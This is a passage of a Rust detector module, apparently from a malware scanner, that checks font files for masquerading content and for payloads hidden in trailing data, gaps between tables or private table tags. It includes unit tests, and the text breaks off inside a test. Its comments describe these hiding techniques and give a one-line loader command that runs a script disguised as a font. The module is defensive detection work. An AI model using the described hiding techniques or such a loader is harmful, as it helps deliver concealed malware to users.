//! Font extractor: sfnt (TrueType/OpenType), WOFF, WOFF2, EOT.
//!
//! Fonts are opaque binary containers that reviewers skim past and that
//! bundlers copy verbatim into `public/`, `static/`, `assets/` and package
//! payloads. That makes them a standing carrier for two families of abuse:
//!
//! - **Masquerade.** A file named `*.woff2` whose bytes are a script or a PE.
//!   The loader that runs it names it explicitly (`node ./fonts/x.woff2`), so
//!   the disguise only has to survive a human skim and a type-driven scanner
//!   that skips "media".
//! - **Steganography / stowaway payloads.** A structurally *valid* font whose
//!   table directory does not account for every byte: data appended past the
//!   last table, data parked in the gaps between tables, or a private
//!   four-character table tag holding a blob. The font still renders, so
//!   nothing downstream complains.
//!
//! This module is a single bounded pass that answers "is this actually a font,
//! and does its structure account for its bytes". It never decodes glyph
//! outlines, decompresses WOFF table data, or renders anything.
//!
//! Emitted facts:
//!
//! - `font.format` — `truetype`, `opentype`, `truetype_collection`, `woff`,
//!   `woff2`, `eot`, or `none` when no known font signature is present.
//! - `font.valid` — the signature is a known font format *and* its declared
//!   structure fits inside the file.
//! - `font.tables[]` / `font.unknown_tables[]` — four-character table tags in
//!   directory order, and the subset outside the registered OpenType set.
//! - `font.features[]` — Pike-style flag array: `trailing_data`,
//!   `interior_gaps`, `overlapping_tables`, `table_out_of_bounds`,
//!   `truncated`, `size_mismatch`, `unknown_tables`, `signed` (DSIG),
//!   `variable` (fvar), `bitmap` (colour/bitmap strikes), `text_content`.
//! - `font.stowaway[]` — what the bytes the table directory does not account
//!   for turn out to be: `pe`, `elf`, `macho`, `zip`, `gzip`, `xz`, `bzip2`,
//!   `sevenz`, `rar`, `cab`, `zstd`, `shebang`, `base64`, `text`,
//!   `high_entropy`. This is the difference between "a font with slack" and
//!   "a font carrying a Windows executable".
//! - `font.content_kind` — for a file with no font signature, the same
//!   classification applied to the whole file.
//! - `font.problems[]` — why `font.valid` is false, in analyst-readable form.
//! - `font.sfnt_version` — the wrapped sfnt flavor for WOFF/WOFF2/EOT.
//!
//! Metrics mirror the PNG extractor's shape so rules read the same way across
//! carrier formats: `font.table_count`, `font.unknown_table_count`,
//! `font.trailing_bytes`, `font.gap_bytes`, `font.largest_table_bytes`,
//! `font.declared_size_delta`, `font.printable_ratio`,
//! `font.leading_whitespace_bytes`.

use crate::metric;
use serde_json::Value as JsonValue;

use crate::error::Error;
use crate::formats::carrier::{classify_region, leading_whitespace, printable_ratio};
use crate::formats::common::{XorScan, extract_binary_strings};
use crate::output::{Metrics, Strings, Values};
use crate::scan::entropy;

/// sfnt table records are 16 bytes: tag, checksum, offset, length.
const SFNT_RECORD_LEN: usize = 16;
/// WOFF table records are 20 bytes: tag, offset, compLength, origLength, checksum.
const WOFF_RECORD_LEN: usize = 20;
/// Offset of the EOT `MagicNumber` field (`0x504C`, little-endian).
const EOT_MAGIC_OFFSET: usize = 34;

/// A table directory entry reduced to what structural analysis needs.
struct TableEntry {
    tag: String,
    offset: u64,
    length: u64,
}

/// Which font container the signature says this is.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Format {
    TrueType,
    OpenType,
    Collection,
    Woff,
    Woff2,
    Eot,
    /// No recognised font signature. The file is named like a font and is
    /// being analysed as one, but its bytes are something else.
    None,
}

impl Format {
    const fn label(self) -> &'static str {
        match self {
            Self::TrueType => "truetype",
            Self::OpenType => "opentype",
            Self::Collection => "truetype_collection",
            Self::Woff => "woff",
            Self::Woff2 => "woff2",
            Self::Eot => "eot",
            Self::None => "none",
        }
    }
}

/// Accumulates the structural verdict as the pass walks the container.
#[derive(Default)]
struct Report {
    tables: Vec<String>,
    unknown_tables: Vec<String>,
    features: Vec<&'static str>,
    problems: Vec<String>,
    sfnt_version: Option<String>,
    trailing_bytes: u64,
    gap_bytes: u64,
    largest_table_bytes: u64,
    /// Bytes held by table tags outside the registered set. Vendor-private
    /// tags are common and tiny (FontForge's `FFTM` is 12 bytes, Monotype's
    /// `MTfn` a few dozen); a private tag holding kilobytes is a carrier.
    unknown_table_bytes: u64,
    /// What the bytes a font does not account for turn out to be — see
    /// [`classify_region`]. Empty when every byte is claimed by a registered
    /// table, which is the normal case.
    stowaway: Vec<&'static str>,
    /// Total size of the regions no table accounts for: interior gaps,
    /// trailing data, and tables under an unregistered tag. The `name`/`post`
    /// string tables are searched for payload signatures too but are *not*
    /// counted here — they are legitimately claimed content, and counting
    /// them reported 4 KB of "stowaway" on every ordinary font.
    stowaway_bytes: u64,
    /// Shannon entropy over those same regions. Near 8.0 means compressed or
    /// encrypted content, which no font format leaves lying between tables.
    stowaway_entropy: f64,
    /// For a file with no font signature: what its bytes actually are.
    content_kind: Option<&'static str>,
    /// Declared total size minus actual size. Non-zero means the header and
    /// the file disagree about how many bytes the font occupies.
    declared_size_delta: i64,
    structure_ok: bool,
}

impl Report {
    fn flag(&mut self, name: &'static str) {
        if !self.features.contains(&name) {
            self.features.push(name);
        }
    }

    fn stow(&mut self, kind: &'static str) {
        if !self.stowaway.contains(&kind) {
            self.stowaway.push(kind);
        }
    }

    fn problem(&mut self, what: impl Into<String>) {
        self.structure_ok = false;
        let what = what.into();
        if !self.problems.contains(&what) {
            self.problems.push(what);
        }
    }
}

pub(super) fn extract(
    bytes: &[u8],
    values: &mut Values,
    strings: &mut Strings,
    metrics: &mut Metrics,
) -> Result<(), Error> {
    // A font that is really a script still deserves a string view: the
    // masquerade case is exactly the one where the strings are the evidence.
    extract_binary_strings(bytes, strings, XorScan::No);

    let format = classify(bytes);
    let mut report = Report {
        structure_ok: format != Format::None,
        ..Report::default()
    };

    match format {
        Format::TrueType | Format::OpenType => walk_sfnt(bytes, &mut report),
        Format::Collection => walk_collection(bytes, &mut report),
        Format::Woff => walk_woff(bytes, &mut report),
        Format::Woff2 => walk_woff2(bytes, &mut report),
        Format::Eot => walk_eot(bytes, &mut report),
        Format::None => {
            report.problem("no font signature");
            // Nothing here is a font, so say what it is instead. This is the
            // reachable case where cleave still typed the file `font` — the
            // bytes carry no magic of their own (a raw compressed blob, an
            // encrypted stage, base64) so no other analyzer claimed them.
            report.content_kind = classify_region(bytes).or(Some("unknown"));
        }
    }

    // Text masquerading as a font. A real font is compressed glyph data and
    // binary tables; a printable-ASCII ratio near 1.0 means the bytes are
    // source, markup, or an encoded blob wearing a font extension. Reported
    // for every font-typed file, valid or not: a *valid* font that is also
    // mostly printable is worth a look too.
    let printable = printable_ratio(bytes);
    if printable > 0.95 && !bytes.is_empty() {
        report.flag("text_content");
    }

    values.insert("font.format", JsonValue::String(format.label().to_string()));
    values.insert("font.valid", JsonValue::Bool(report.structure_ok));
    if let Some(v) = report.sfnt_version.take() {
        values.insert("font.sfnt_version", JsonValue::String(v));
    }
    if !report.tables.is_empty() {
        values.insert(
            "font.tables",
            JsonValue::Array(
                report
                    .tables
                    .iter()
                    .cloned()
                    .map(JsonValue::String)
                    .collect(),
            ),
        );
    }
    if !report.unknown_tables.is_empty() {
        report.flag("unknown_tables");
        values.insert(
            "font.unknown_tables",
            JsonValue::Array(
                report
                    .unknown_tables
                    .iter()
                    .cloned()
                    .map(JsonValue::String)
                    .collect(),
            ),
        );
    }
    if let Some(kind) = report.content_kind {
        values.insert("font.content_kind", JsonValue::String(kind.to_string()));
    }
    if !report.stowaway.is_empty() {
        report.flag("stowaway");
        values.insert(
            "font.stowaway",
            JsonValue::Array(
                report
                    .stowaway
                    .iter()
                    .map(|s| JsonValue::String((*s).to_string()))
                    .collect(),
            ),
        );
    }
    if !report.problems.is_empty() {
        values.insert(
            "font.problems",
            JsonValue::Array(
                report
                    .problems
                    .iter()
                    .cloned()
                    .map(JsonValue::String)
                    .collect(),
            ),
        );
    }
    if !report.features.is_empty() {
        values.insert(
            "font.features",
            JsonValue::Array(
                report
                    .features
                    .iter()
                    .map(|s| JsonValue::String((*s).to_string()))
                    .collect(),
            ),
        );
    }

    metrics.insert(metric!("font.table_count"), report.tables.len() as f64);
    metrics.insert(
        metric!("font.unknown_table_count"),
        report.unknown_tables.len() as f64,
    );
    metrics.insert(
        metric!("font.unknown_table_bytes"),
        report.unknown_table_bytes as f64,
    );
    metrics.insert(metric!("font.trailing_bytes"), report.trailing_bytes as f64);
    metrics.insert(metric!("font.gap_bytes"), report.gap_bytes as f64);
    metrics.insert(
        metric!("font.largest_table_bytes"),
        report.largest_table_bytes as f64,
    );
    #[allow(clippy::cast_precision_loss)]
    metrics.insert(
        metric!("font.declared_size_delta"),
        report.declared_size_delta as f64,
    );
    metrics.insert(metric!("font.stowaway_bytes"), report.stowaway_bytes as f64);
    metrics.insert(metric!("font.stowaway_entropy"), report.stowaway_entropy);
    metrics.insert(metric!("font.printable_ratio"), printable);
    metrics.insert(
        metric!("font.leading_whitespace_bytes"),
        leading_whitespace(bytes) as f64,
    );

    Ok(())
}

/// Identify the container from its signature alone.
fn classify(bytes: &[u8]) -> Format {
    if bytes.len() >= 4 {
        match &bytes[..4] {
            b"OTTO" => return Format::OpenType,
            b"ttcf" => return Format::Collection,
            b"wOFF" => return Format::Woff,
            b"wOF2" => return Format::Woff2,
            // `true` and `typ1` are the legacy Apple sfnt flavors; 0x00010000
            // is the Microsoft/Windows one that essentially every `.ttf` uses.
            b"true" | b"typ1" | [0x00, 0x01, 0x00, 0x00] => return Format::TrueType,
            _ => {}
        }
    }
    // EOT has no leading signature — it opens with two little-endian sizes.
    // The `MagicNumber` field at byte 34 is what identifies it.
    if bytes.len() > EOT_MAGIC_OFFSET + 1
        && bytes[EOT_MAGIC_OFFSET] == 0x4C
        && bytes[EOT_MAGIC_OFFSET + 1] == 0x50
    {
        return Format::Eot;
    }
    Format::None
}

/// Walk an sfnt table directory starting at `base`, returning its entries and
/// the offset where the directory ends. Coverage is folded in by the caller so
/// a collection can account for every member against one shared picture.
fn read_sfnt_dir(bytes: &[u8], base: usize, report: &mut Report) -> (Vec<TableEntry>, u64) {
    let Some(header) = bytes.get(base..base + 12) else {
        report.problem("header truncated");
        report.flag("truncated");
        return (Vec::new(), 0);
    };
    report.sfnt_version = Some(sfnt_version_label(&header[..4]));

    let num_tables = u16::from_be_bytes([header[4], header[5]]) as usize;
    let dir_start = base + 12;
    let Some(dir_end) = num_tables
        .checked_mul(SFNT_RECORD_LEN)
        .and_then(|n| dir_start.checked_add(n))
    else {
        report.problem("table count overflows");
        return (Vec::new(), 0);
    };
    if dir_end > bytes.len() {
        report.problem("table directory truncated");
        report.flag("truncated");
        return (Vec::new(), 0);
    }

    let mut entries = Vec::with_capacity(num_tables);
    for i in 0..num_tables {
        let rec = &bytes[dir_start + i * SFNT_RECORD_LEN..dir_start + (i + 1) * SFNT_RECORD_LEN];
        let tag = tag_label(&rec[..4]);
        let offset = u64::from(u32::from_be_bytes([rec[8], rec[9], rec[10], rec[11]]));
        let length = u64::from(u32::from_be_bytes([rec[12], rec[13], rec[14], rec[15]]));
        entries.push(TableEntry {
            tag,
            offset,
            length,
        });
    }
    (entries, dir_end as u64)
}

/// A bare `.ttf`/`.otf`: one directory, folded straight into coverage.
fn walk_sfnt(bytes: &[u8], report: &mut Report) {
    let (entries, dir_end) = read_sfnt_dir(bytes, 0, report);
    record_tables(bytes, dir_end, &entries, report);
}

/// A TrueType collection is a header of offsets into sfnt directories whose
/// members deliberately *share* table data — a `.ttc` exists precisely so two
/// faces can point at one `glyf`. Coverage must therefore be computed across
/// the union of every member's directory; folding each member in on its own
/// reports the bytes claimed by earlier members as unaccounted-for, which
/// marked every shipped macOS `.ttc` invalid.
fn walk_collection(bytes: &[u8], report: &mut Report) {
    let Some(header) = bytes.get(..16) else {
        report.problem("collection header truncated");
        report.flag("truncated");
        return;
    };
    report.sfnt_version = Some("ttcf".to_string());
    let num_fonts = u32::from_be_bytes([header[8], header[9], header[10], header[11]]) as usize;
    // A collection with thousands of members is malformed, not a font. The
    // cap keeps a hostile header from turning into a long walk.
    if num_fonts == 0 || num_fonts > 512 {
        report.problem("implausible collection member count");
        return;
    }
    // The header itself, plus the offset array, is covered ground.
    let mut dir_end = (12 + num_fonts * 4) as u64;
    let mut all: Vec<TableEntry> = Vec::new();
    for i in 0..num_fonts {
        let at = 12 + i * 4;
        let Some(rec) = bytes.get(at..at + 4) else {
            report.problem("collection offset table truncated");
            report.flag("truncated");
            return;
        };
        let off = u32::from_be_bytes([rec[0], rec[1], rec[2], rec[3]]) as usize;
        if off >= bytes.len() {
            report.problem("collection member offset out of bounds");
            report.flag("table_out_of_bounds");
            continue;
        }
        let (entries, member_dir_end) = read_sfnt_dir(bytes, off, report);
        dir_end = dir_end.max(member_dir_end);
        all.extend(entries);
    }
    // Shared tables appear once per referencing member. Collapse them so an
    // extent is neither double-counted nor mistaken for an overlap.
    all.sort_unstable_by_key(|e| (e.offset, e.length));
    all.dedup_by(|a, b| a.offset == b.offset && a.length == b.length && a.tag == b.tag);
    record_tables(bytes, dir_end, &all, report);
}

/// WOFF wraps an sfnt in a per-table-compressed container. The directory is
/// uncompressed, so table extents are readable without inflating anything.
fn walk_woff(bytes: &[u8], report: &mut Report) {
    let Some(header) = bytes.get(..44) else {
        report.problem("header truncated");
        report.flag("truncated");
        return;
    };
    report.sfnt_version = Some(sfnt_version_label(&header[4..8]));
    let declared = u64::from(u32::from_be_bytes([
        header[8], header[9], header[10], header[11],
    ]));
    note_declared_size(declared, bytes.len(), report);

    let num_tables = u16::from_be_bytes([header[12], header[13]]) as usize;
    let dir_start = 44usize;
    let Some(dir_end) = num_tables
        .checked_mul(WOFF_RECORD_LEN)
        .and_then(|n| dir_start.checked_add(n))
    else {
        report.problem("table count overflows");
        return;
    };
    if dir_end > bytes.len() {
        report.problem("table directory truncated");
        report.flag("truncated");
        return;
    }

    let mut entries = Vec::with_capacity(num_tables);
    for i in 0..num_tables {
        let rec = &bytes[dir_start + i * WOFF_RECORD_LEN..dir_start + (i + 1) * WOFF_RECORD_LEN];
        let tag = tag_label(&rec[..4]);
        let offset = u64::from(u32::from_be_bytes([rec[4], rec[5], rec[6], rec[7]]));
        // compLength is the on-disk extent; origLength is the inflated size.
        let length = u64::from(u32::from_be_bytes([rec[8], rec[9], rec[10], rec[11]]));
        entries.push(TableEntry {
            tag,
            offset,
            length,
        });
    }
    // The metadata and private blocks are legitimate parts of the container,
    // so count them as covered rather than reporting them as stowaways.
    let mut extra = Vec::new();
    for (off_at, len_at, name) in [(24usize, 28usize, "__meta"), (36usize, 40usize, "__priv")] {
        let off = u64::from(u32::from_be_bytes([
            header[off_at],
            header[off_at + 1],
            header[off_at + 2],
            header[off_at + 3],
        ]));
        let len = u64::from(u32::from_be_bytes([
            header[len_at],
            header[len_at + 1],
            header[len_at + 2],
            header[len_at + 3],
        ]));
        if off > 0 && len > 0 {
            extra.push(TableEntry {
                tag: name.to_string(),
                offset: off,
                length: len,
            });
        }
    }
    entries.extend(extra);
    record_tables(bytes, dir_end as u64, &entries, report);
}

/// WOFF2's directory uses a variable-length integer encoding and its table
/// data is one Brotli stream, so per-table extents are not addressable without
/// decompressing. Record what the fixed header declares and check it against
/// the file — enough to catch truncation, size lies, and appended data.
fn walk_woff2(bytes: &[u8], report: &mut Report) {
    let Some(header) = bytes.get(..48) else {
        report.problem("header truncated");
        report.flag("truncated");
        return;
    };
    report.sfnt_version = Some(sfnt_version_label(&header[4..8]));
    let declared = u64::from(u32::from_be_bytes([
        header[8], header[9], header[10], header[11],
    ]));
    note_declared_size(declared, bytes.len(), report);

    let num_tables = u16::from_be_bytes([header[12], header[13]]);
    if num_tables == 0 {
        report.problem("no tables declared");
    }
    let compressed = u64::from(u32::from_be_bytes([
        header[20], header[21], header[22], header[23],
    ]));
    if compressed > bytes.len() as u64 {
        report.problem("compressed data larger than file");
        report.flag("table_out_of_bounds");
    }
    report.largest_table_bytes = compressed;
    // The directory is variable-length, so tag names are not recoverable here.
    // Record the count so `font.table_count` stays comparable across formats.
    for _ in 0..num_tables {
        report.tables.push(String::from("?"));
    }
}

/// Embedded OpenType: a little-endian header wrapping an sfnt (optionally
/// MTX-compressed). Validate the two size fields against the file.
fn walk_eot(bytes: &[u8], report: &mut Report) {
    let Some(header) = bytes.get(..EOT_MAGIC_OFFSET + 2) else {
        report.problem("header truncated");
        report.flag("truncated");
        return;
    };
    let eot_size = u64::from(u32::from_le_bytes([
        header[0], header[1], header[2], header[3],
    ]));
    let font_data_size = u64::from(u32::from_le_bytes([
        header[4], header[5], header[6], header[7],
    ]));
    report.sfnt_version = Some("eot".to_string());
    note_declared_size(eot_size, bytes.len(), report);
    if font_data_size > bytes.len() as u64 {
        report.problem("font data size exceeds file");
        report.flag("table_out_of_bounds");
    }
    report.largest_table_bytes = font_data_size;
}

/// Compare a header-declared total size against the real one.
fn note_declared_size(declared: u64, actual: usize, report: &mut Report) {
    let actual = actual as u64;
    if declared == 0 || declared == actual {
        return;
    }
    report.declared_size_delta = declared as i64 - actual as i64;
    report.flag("size_mismatch");
    if declared > actual {
        report.problem("declared size exceeds file");
        report.flag("truncated");
    } else {
        // Extra bytes past what the header claims: the renderer stops at
        // `declared`, so everything after it rides along unread.
        report.trailing_bytes = actual - declared;
        report.flag("trailing_data");
        report.problem("file larger than declared size");
    }
}

/// Fold a table directory into the coverage picture: bounds, overlaps, the
/// bytes no table claims, and the bytes past the last one.
fn record_tables(bytes: &[u8], dir_end: u64, entries: &[TableEntry], report: &mut Report) {
    let file_len = bytes.len() as u64;
    if entries.is_empty() {
        report.problem("no tables declared");
        return;
    }

    let mut extents: Vec<(u64, u64)> = Vec::with_capacity(entries.len());
    for e in entries {
        // `__meta`/`__priv` are synthetic container regions, not real tags.
        if !e.tag.starts_with("__") {
            if !report.tables.contains(&e.tag) {
                report.tables.push(e.tag.clone());
            }
            if !is_registered_tag(&e.tag) {
                report.unknown_table_bytes = report.unknown_table_bytes.saturating_add(e.length);
                if !report.unknown_tables.contains(&e.tag) {
                    report.unknown_tables.push(e.tag.clone());
                }
            }
        }
        report.largest_table_bytes = report.largest_table_bytes.max(e.length);
        let Some(end) = e.offset.checked_add(e.length) else {
            report.problem("table extent overflows");
            report.flag("table_out_of_bounds");
            continue;
        };
        if end > file_len {
            report.problem("table extends past end of file");
            report.flag("table_out_of_bounds");
            continue;
        }
        extents.push((e.offset, end));

        // A table under an unregistered tag is the one place inside the
        // directory where a payload can sit and still render, because nothing
        // reads it. `name`/`post` are scanned too: they are the format's
        // string tables, so an executable or archive signature in them is
        // unambiguous even though readable text there is expected.
        if !is_registered_tag(&e.tag) {
            note_region(bytes, e.offset, end, report, RegionKind::Unclaimed);
        } else if matches!(e.tag.as_str(), "name" | "post") {
            note_region(bytes, e.offset, end, report, RegionKind::StringTable);
        }
    }
    if extents.is_empty() {
        return;
    }

    extents.sort_unstable();
    let mut covered_to = dir_end;
    let mut gaps: u64 = 0;
    for &(start, end) in &extents {
        if start < covered_to {
            // sfnt permits nothing to overlap; sharing bytes between tables is
            // a hand-built file, and the overlap is where a payload hides.
            report.flag("overlapping_tables");
        } else {
            // Anything past the 4-byte alignment slack is a real hole. Skip
            // the slack itself so ordinary padding is not classified.
            if start - covered_to > 3 {
                note_region(bytes, covered_to, start, report, RegionKind::Unclaimed);
            }
            gaps += start - covered_to;
        }
        covered_to = covered_to.max(end);
    }

    // Tables are 4-byte aligned, so up to 3 bytes of padding between any two
    // is expected. Charge gaps only beyond that slack.
    let slack = 3 * extents.len() as u64;
    report.gap_bytes = gaps.saturating_sub(slack);
    if report.gap_bytes > 0 {
        report.flag("interior_gaps");
        report.problem("bytes not claimed by any table");
    }

    // Trailing data past the last table. `note_declared_size` may already have
    // charged this for WOFF; keep the larger of the two views.
    let trailing = file_len.saturating_sub(covered_to);
    let trailing = trailing.saturating_sub(3); // final table's alignment padding
    if trailing > 0 {
        report.trailing_bytes = report.trailing_bytes.max(trailing);
        report.flag("trailing_data");
        report.problem("data appended after last table");
        note_region(bytes, covered_to, file_len, report, RegionKind::Unclaimed);
    }

    for tag in report.tables.clone() {
        match tag.as_str() {
            "DSIG" => report.flag("signed"),
            "fvar" => report.flag("variable"),
            "CBDT" | "EBDT" | "sbix" | "SVG " => report.flag("bitmap"),
            _ => {}
        }
    }
}

/// Why a region is being examined, which decides how its findings count.
#[derive(Clone, Copy, PartialEq, Eq)]
enum RegionKind {
    /// Bytes no table claims: interior gaps, trailing data, and tables under
    /// an unregistered tag. These are the stowaway surface, so their size and
    /// entropy are the reported totals and every classification counts.
    Unclaimed,
    /// A registered string table (`name`, `post`). The format puts readable
    /// text here on purpose, so text is expected and the bytes are legitimate
    /// content — they must not inflate `font.stowaway_bytes`. Only a payload
    /// signature is worth reporting.
    StringTable,
}

/// Examine one region and fold what it contains into the stowaway verdict.
/// Classification itself is [`carrier::classify_region`], shared with every
/// other container so a payload is named the same way wherever it hides.
fn note_region(bytes: &[u8], start: u64, end: u64, report: &mut Report, kind: RegionKind) {
    let (Ok(start), Ok(end)) = (usize::try_from(start), usize::try_from(end)) else {
        return;
    };
    let Some(region) = bytes.get(start..end.min(bytes.len())) else {
        return;
    };
    if region.is_empty() {
        return;
    }
    if kind == RegionKind::Unclaimed {
        report.stowaway_bytes = report.stowaway_bytes.saturating_add(region.len() as u64);
        report.stowaway_entropy = report.stowaway_entropy.max(entropy::shannon(region));
    }
    if let Some(found) = classify_region(region)
        && (kind == RegionKind::Unclaimed || !matches!(found, "text" | "base64" | "high_entropy"))
    {
        report.stow(found);
    }
}

/// Render a four-byte sfnt version as an analyst-readable label.
fn sfnt_version_label(v: &[u8]) -> String {
    match v {
        [0x00, 0x01, 0x00, 0x00] => "1.0".to_string(),
        _ => tag_label(v),
    }
}

/// A four-character tag, with non-printable bytes escaped so a hostile tag
/// cannot inject control characters into the report.
fn tag_label(raw: &[u8]) -> String {
    raw.iter()
        .map(|&b| {
            if (0x20..0x7f).contains(&b) {
                char::from(b).to_string()
            } else {
                format!("\\x{b:02x}")
            }
        })
        .collect()
}

/// Registered OpenType/TrueType table tags (OpenType 1.9 plus the Apple and
/// colour-font extensions in common use). Anything outside this set surfaces
/// in `font.unknown_tables` the way `png.unknown_chunks` does.
///
/// An unknown tag is a lead, never a verdict: ~5% of the fonts macOS ships
/// carry a vendor-private tag (`MERG`, `TSIV`, `MTfn`, `clas`, `BUSG`). What
/// separates those from a carrier is size, which is why
/// `font.unknown_table_bytes` is emitted alongside the count — a real private
/// tag holds tens of bytes, a payload holds kilobytes.
fn is_registered_tag(tag: &str) -> bool {
    matches!(
        tag,
        // Required / core
        "cmap" | "head" | "hhea" | "hmtx" | "maxp" | "name" | "OS/2" | "post"
        // TrueType outlines
        | "cvt " | "fpgm" | "glyf" | "loca" | "prep" | "gasp"
        // CFF outlines
        | "CFF " | "CFF2" | "VORG"
        // Bitmap / colour
        | "EBDT" | "EBLC" | "EBSC" | "CBDT" | "CBLC" | "sbix" | "COLR" | "CPAL" | "SVG "
        // Advanced typography
        | "BASE" | "GDEF" | "GPOS" | "GSUB" | "JSTF" | "MATH"
        // Variable fonts
        | "avar" | "cvar" | "fvar" | "gvar" | "HVAR" | "MVAR" | "STAT" | "VVAR"
        // Other registered
        | "DSIG" | "hdmx" | "kern" | "LTSH" | "PCLT" | "VDMX" | "vhea" | "vmtx"
        // Apple Advanced Typography
        | "acnt" | "ankr" | "bdat" | "bloc" | "bsln" | "fdsc" | "feat" | "fmtx"
        | "fond" | "just" | "lcar" | "ltag" | "meta" | "mort" | "morx" | "opbd"
        | "prop" | "trak" | "xref" | "Zapf" | "kerx" | "bhed"
        // Not in the OpenType registry, but emitted by mainstream font
        // toolchains and shipped in fonts on every desktop. Treating these as
        // unknown would make `font.unknown_table_count` fire on Font Awesome,
        // DejaVu, Charis and most libre families, and
        // `font.unknown_table_bytes` fire on Apple Color Emoji (300 KB across
        // `cntr`/`bgcl`), Arial Narrow (40 KB of `TSIV`) and Futura (35 KB of
        // `BUSG`/`SOPG`) — which would cost both metrics their meaning as
        // stowaway signals. Measured against the 566 fonts macOS ships: with
        // this set registered, none reports an unknown table at all.
        //
        // This is a name list, so it bounds what the metrics can prove: an
        // author who parks a payload under one of these tags is not
        // distinguishable by tag alone. The coverage legs (`font.gap_bytes`,
        // `font.trailing_bytes`) do not depend on tag names and still apply.
        // FontForge toolchain:
        | "FFTM" | "PfEd" | "TeX " | "BDF " | "FFTB"
        // SIL Graphite smart fonts:
        | "Feat" | "Glat" | "Gloc" | "Silf" | "Sill"
        // Apple: Color Emoji layer tables, SF merge data, Skia classification,
        // and the AppleMyungjo pair.
        | "cntr" | "bgcl" | "MERG" | "clas" | "CVTM" | "TPNM"
        // Monotype / Agfa: sign-instruction and font-metadata tables shipped
        // in the Arial, Trebuchet and Futura families.
        | "TSIV" | "MTfn" | "BUSG" | "SOPG"
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run(bytes: &[u8]) -> (Values, Metrics) {
        let mut v = Values::new();
        let mut s = Strings::default();
        let mut m = Metrics::new();
        extract(bytes, &mut v, &mut s, &mut m).unwrap();
        (v, m)
    }

    fn format_of(v: &Values) -> String {
        v.get("font.format")
            .and_then(|x| x.as_str())
            .unwrap_or_default()
            .to_string()
    }

    fn features(v: &Values) -> Vec<String> {
        v.get("font.features")
            .and_then(|x| x.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|x| x.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default()
    }

    /// Build a minimal but well-formed sfnt: header, directory, then each
    /// table's bytes laid end to end immediately after the directory.
    fn build_sfnt(version: [u8; 4], tables: &[(&[u8; 4], &[u8])]) -> Vec<u8> {
        build_sfnt_at(0, version, tables)
    }

    /// Same, for an sfnt that will be embedded at `base` inside a larger file.
    /// sfnt table offsets are absolute from the start of the *file*, not the
    /// directory, so a collection member has to be built knowing where it lands.
    fn build_sfnt_at(base: usize, version: [u8; 4], tables: &[(&[u8; 4], &[u8])]) -> Vec<u8> {
        let dir_end = base + 12 + tables.len() * SFNT_RECORD_LEN;
        let mut header = Vec::new();
        header.extend_from_slice(&version);
        header.extend_from_slice(&(tables.len() as u16).to_be_bytes());
        header.extend_from_slice(&[0; 6]); // searchRange/entrySelector/rangeShift

        let mut dir = Vec::new();
        let mut body = Vec::new();
        let mut offset = dir_end;
        for (tag, data) in tables {
            dir.extend_from_slice(*tag);
            dir.extend_from_slice(&[0; 4]); // checksum (unchecked)
            dir.extend_from_slice(&(offset as u32).to_be_bytes());
            dir.extend_from_slice(&(data.len() as u32).to_be_bytes());
            body.extend_from_slice(data);
            offset += data.len();
        }

        let mut out = header;
        out.extend_from_slice(&dir);
        out.extend_from_slice(&body);
        out
    }

    #[test]
    fn valid_truetype_is_valid() {
        let font = build_sfnt(
            [0x00, 0x01, 0x00, 0x00],
            &[(b"head", &[0u8; 54]), (b"cmap", &[0u8; 32])],
        );
        let (v, m) = run(&font);
        assert_eq!(format_of(&v), "truetype");
        assert_eq!(v.get("font.valid").and_then(JsonValue::as_bool), Some(true));
        assert_eq!(m.get("font.table_count"), Some(2.0));
        assert_eq!(m.get("font.trailing_bytes"), Some(0.0));
        assert_eq!(m.get("font.gap_bytes"), Some(0.0));
        assert_eq!(m.get("font.unknown_table_count"), Some(0.0));
        assert_eq!(
            v.get("font.sfnt_version").and_then(|x| x.as_str()),
            Some("1.0")
        );
    }

    #[test]
    fn otto_is_opentype() {
        let font = build_sfnt(*b"OTTO", &[(b"CFF ", &[0u8; 16])]);
        let (v, _) = run(&font);
        assert_eq!(format_of(&v), "opentype");
    }

    #[test]
    fn appended_payload_is_trailing_data() {
        let mut font = build_sfnt([0x00, 0x01, 0x00, 0x00], &[(b"head", &[0u8; 54])]);
        font.extend_from_slice(b"-----BEGIN PAYLOAD----- lots of stowaway bytes here");
        let (v, m) = run(&font);
        assert!(features(&v).contains(&"trailing_data".to_string()));
        assert!(m.get("font.trailing_bytes").unwrap() > 40.0);
        assert_eq!(
            v.get("font.valid").and_then(JsonValue::as_bool),
            Some(false)
        );
    }

    /// A gap between two tables is where a payload hides in a font that still
    /// renders: no table points at those bytes, so nothing reads them.
    #[test]
    fn interior_gap_is_reported() {
        // Hand-build a directory whose second table starts 64 bytes late.
        let dir_end = 12 + 2 * SFNT_RECORD_LEN;
        let mut out = Vec::new();
        out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
        out.extend_from_slice(&2u16.to_be_bytes());
        out.extend_from_slice(&[0; 6]);
        let first_len = 16u32;
        let gap = 64u32;
        let second_off = dir_end as u32 + first_len + gap;
        for (tag, off, len) in [
            (b"head", dir_end as u32, first_len),
            (b"cmap", second_off, 16u32),
        ] {
            out.extend_from_slice(tag);
            out.extend_from_slice(&[0; 4]);
            out.extend_from_slice(&off.to_be_bytes());
            out.extend_from_slice(&len.to_be_bytes());
        }
        out.resize((second_off + 16) as usize, 0x41);
        let (v, m) = run(&out);
        assert!(features(&v).contains(&"interior_gaps".to_string()));
        assert!(m.get("font.gap_bytes").unwrap() >= 55.0);
        assert_eq!(
            v.get("font.valid").and_then(JsonValue::as_bool),
            Some(false)
        );
    }

    #[test]
    fn private_tag_is_unknown() {
        let font = build_sfnt([0x00, 0x01, 0x00, 0x00], &[(b"PWNZ", &[0u8; 8])]);
        let (v, m) = run(&font);
        let unknown = v
            .get("font.unknown_tables")
            .and_then(|x| x.as_array())
            .unwrap();
        assert_eq!(unknown[0].as_str(), Some("PWNZ"));
        assert_eq!(m.get("font.unknown_table_count"), Some(1.0));
        assert_eq!(m.get("font.unknown_table_bytes"), Some(8.0));
        assert!(features(&v).contains(&"unknown_tables".to_string()));
    }

    #[test]
    fn table_past_end_of_file_is_out_of_bounds() {
        let dir_end = 12 + SFNT_RECORD_LEN;
        let mut out = Vec::new();
        out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
        out.extend_from_slice(&1u16.to_be_bytes());
        out.extend_from_slice(&[0; 6]);
